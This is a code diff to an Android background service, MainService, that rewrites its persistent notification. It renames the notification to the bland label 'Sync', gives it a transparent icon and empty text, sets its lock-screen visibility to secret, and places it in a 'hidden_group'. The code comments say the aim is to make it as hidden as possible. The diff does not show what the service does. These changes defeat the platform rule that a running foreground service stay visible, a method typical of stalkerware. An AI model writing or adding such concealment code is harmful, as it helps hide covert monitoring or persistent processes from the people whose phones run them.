@@ -64,13 +64,21 @@ public class MainService extends Service {
         scheduleWatchdog();
     }
 
-    // Create notification channel
+    // Create notification channel (minimal visibility)
     private void createChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel ch = new NotificationChannel(
-                CHANNEL, "Service", NotificationManager.IMPORTANCE_MIN);
+                CHANNEL, "Sync", NotificationManager.IMPORTANCE_MIN);
+            ch.setDescription("");
             ch.setShowBadge(false);
             ch.setSound(null, null);
+            ch.enableLights(false);
+            ch.enableVibration(false);
+            ch.setBypassDnd(false);
+            ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                ch.setAllowBubbles(false);
+            }
             NotificationManager nm = getSystemService(NotificationManager.class);
             if (nm != null) nm.createNotificationChannel(ch);
         }
@@ -88,14 +96,24 @@ public class MainService extends Service {
         }
     }
 
-    // Build notification
+    // Build notification (minimal/hidden as possible)
     private Notification buildNotification() {
         return new NotificationCompat.Builder(this, CHANNEL)
-            .setContentTitle("Service Active")
-            .setSmallIcon(R.mipmap.ic_launcher)
+            .setSmallIcon(R.drawable.ic_transparent)
+            .setContentTitle("Sync")
+            .setContentText("")
+            .setTicker("")
+            .setSubText("")
             .setOngoing(true)
             .setSilent(true)
+            .setOnlyAlertOnce(true)
+            .setLocalOnly(true)
             .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setShowWhen(false)
+            .setGroup("hidden_group")
+            .setGroupSummary(false)
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .build();
     }
 
